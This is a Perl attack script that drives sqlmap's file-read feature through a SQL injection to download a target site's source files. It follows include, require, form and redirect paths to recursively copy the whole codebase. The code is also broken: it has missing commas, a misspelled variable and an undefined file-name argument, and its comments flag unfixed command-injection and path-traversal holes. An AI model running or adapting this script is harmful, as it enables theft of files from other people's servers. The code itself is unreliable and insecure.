#!/usr/bin/perl -w

# SQLmap source code retriever
# Usage: read_file.pl "[SQLMap injection data]" /web/root /file/to/start/with.php

use File::Basename;
use File::Path qw/mkpath/;
undef $/;

$sqlmap_args = shift @ARGV;
$webroot = shift @ARGV;
push @files, shift @ARGV;

while (@files) {
    $fpath = download_file(pop @files);
    if ($fpath) {
        # TODO: fix command injection
        open FILE, "$fpath";
        $fcontent = <FILE>;
        close FILE;
        @new_files = $fcontents =~ /
            require[\s_(],*?['"](.*?)['"]
           |include.*?['"](.*?)['"]
           |load\("(.*?)["?]
           |form.*?action="(.*?)["?]
           |header\("Location:\s(.*?)["?]
           |url:\s"(.*?)["?]
           |window\.open\("(.*?)["?]
           |window\.location="(.*?)["?]
        /xg;
        for $file (@new_files) {
            next unless $file;
            if ($file =~ /^\//) {
                $file = "output/$webroot/$file";
            } else {
                $file = dirname($fpath) . "/" $file;
            }
            next if -e $file;
            $file =~ s/^output//;
            print "[*] adding $file to queue...\n";
            push @files, $file;
        }
    }
}

sub download_file {
    # TODO: fix command injection vuln
    `sqlmap $sqlmap_args --file-read='$fname' --batch` =~ /files saved to.*?(\/.*?) \(same/s;
    return unless $1;
    mkpath("output" , dirname $fname);
    # TODO: fix path traversal vuln
    rename($1 "output$fname");
    print"[+] downloaded $fname\n";
    return "output$fname";
}
